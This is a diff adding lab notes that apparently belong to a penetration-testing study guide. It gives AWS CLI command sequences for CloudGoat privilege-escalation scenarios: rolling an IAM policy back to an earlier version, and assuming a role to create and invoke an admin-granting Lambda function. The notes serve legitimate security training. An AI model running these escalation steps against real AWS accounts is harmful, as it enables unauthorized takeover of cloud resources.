@@ -567,11 +567,69 @@ Got the necessary details to make the API request and navigated to [https://s33p
 
 #### Configuration CloudGoat
 
+> Will need to have the requirements mentioned on the GitHub page installed
+
+```bash
+git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
+cd cloudgoat
+pip install -r requirements.txt
+./coudgoat.py config profile <profile name>
+./cloudgoat.py config whitelist --auto
+```
+
 #### IAM PrivEsc by Rollback
 
-#### Lambda PriveEsc
+```bash
+# Check user info
+aws --profile raynor sts get-caller-identity
+# Check for IAM policies
+aws --profile raynor iam list-attached-user-policies --user-name <USER NAME>
+# Check what the found policies do
+aws --profile raynor iam get-policy --policy-arn <POLICY ARN>
+# Check policy version details
+aws --profile raynor iam get-policy-version --policy-arn <POLICY ARN> --version-id v1
+# Check for other policy versions available
+aws --profile raynor iam list-policy-versions --policy-arn <POLICY ARN>
+# Check for changes between policy versions found
+aws --profile raynor iam get-policy-version --policy-arn <POLICY ARN> --version-id v2
+aws --profile raynor iam get-policy-version --policy-arn <POLICY ARN> --version-id v3
+aws --profile raynor iam get-policy-version --policy-arn <POLICY ARN> --version-id v4
+aws --profile raynor iam get-policy-version --policy-arn <POLICY ARN> --version-id v5
+# Since in v1 we have the permission to SetDefaultPolicyVersion, we can rollback to a different policy version and take the affect of its permissions
+aws --profile raynor iam set-default-policy-version --policy-arn <POLICY ARN> --version-id v4
+# Test permissions before and after policy version change
+aws --profile raynor s3 ls
+```
 
-#### Lambda PrivEsc Pt 2
+#### Lambda PrivEsc
+
+```bash
+aws configure --profile chris
+aws --profile sts get-caller-identity
+# Check to see any low hanging fruit
+aws --profile chris s3 ls
+# Check for policies, roles, etc.
+aws --profile chris iam list-user-policies --user-name <USER NAME>
+aws --profile chris iam list-attached-user-policies --user-name <USER NAME>
+aws --profile chris iam list-roles
+aws --profile chris iam list-attached-role-policies --role-name <ROLE NAME>
+aws --profile chris iam get-policy --policy-arn <POLICY ARN>
+aws --profile chris iam get-policy-version --policy-arn <POLICY ARN> --version-id v1
+aws --profile chris sts assume-role --role-arn <ROLE ARN> --role-session <CUSTOM SESSION NAME>
+# Create a profile with any new found keys and tokens
+aws configure --profile lambda_mgr
+# Create lambda_function.py, put in Python code, and modify the username as necessary
+# Zip up lambda_function.py
+zip lambda_function.zip lambda_function.py
+# Create the function in lambda
+aws --profile lambda_mgr lambda create-function --function-name admin_function --runtime python3.6 --role <ROLE ARN> --handler lambda_function.lambda_handler --zip fileb://lambda_funciton.zip
+# Test permissions before and after lambda execution
+aws --profile chris s3 ls
+# Invoke the lambda function
+aws --profile lambda_mgr lambda invoke --function-name admin_function output.txt
+aws --profile chris iam list-attached-user-policies --user-name <USER NAME>
+aws --profile chris s3 ls
+```
 
 #### Cloud Breach S3
 
